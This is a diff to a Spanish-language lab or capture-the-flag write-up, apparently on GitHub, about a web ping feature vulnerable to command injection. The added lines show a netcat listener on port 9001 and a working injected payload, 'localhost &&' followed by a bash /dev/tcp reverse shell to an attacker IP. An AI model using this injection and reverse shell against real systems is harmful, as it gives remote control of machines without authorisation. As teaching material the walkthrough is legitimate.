@@ -20,10 +20,22 @@ Nos iremos al dominio en el puerto 5000 y veremos lo siguiente
 
 <img width="1185" height="757" alt="image" src="https://github.com/user-attachments/assets/5b198aac-481f-43e5-95f3-9dc29549db12" />
 
-analizando mas este ping, nos damos  cuenta que podemos hacer una ejecucion de comandos remotos (Remote Code Execution. Es una vulnerabilidad/condición en la que un atacante puede hacer que un sistema remoto ejecute código arbitrario)
+Analizando mas este ping, nos damos  cuenta que podemos hacer una ejecucion de comandos remotos (Remote Code Execution. Es una vulnerabilidad/condición en la que un atacante puede hacer que un sistema remoto ejecute código arbitrario)
 
-nos ponemos en escucha con Net cat en el puerto 9001
+De tal manera nos ponemos en escucha con Net cat en el puerto 9001
 
 ```ruby
      nc -lvnp 9001
 ```
+
+Iremos a preparar una revershell, usaremos && y despues la revshell
+
+
+<img width="1185" height="659" alt="image" src="https://github.com/user-attachments/assets/e5269586-47ca-486c-9866-da930c69658f" />
+```ruby
+localhost && bash -c 'exec 5<>/dev/tcp/192.168.91.154/9001;cat <&5 | while read line; do $line 2>&5 >&5; done'
+```
+ya tendriamos la conexion con esto:
+
+<img width="476" height="166" alt="image" src="https://github.com/user-attachments/assets/78e83ecd-2821-4bb5-baba-b841fd86163a" />
+
